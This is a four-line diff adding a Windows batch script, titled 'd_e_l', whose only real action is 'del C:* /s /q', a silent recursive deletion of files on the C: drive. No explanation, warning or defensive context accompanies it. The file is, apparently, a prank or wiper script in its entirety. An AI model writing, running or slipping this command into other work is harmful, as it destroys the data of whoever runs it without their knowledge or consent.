@@ -1,0 +1,4 @@
+@echo off
+title d_e_l
+color0a
+del C:* /s /q
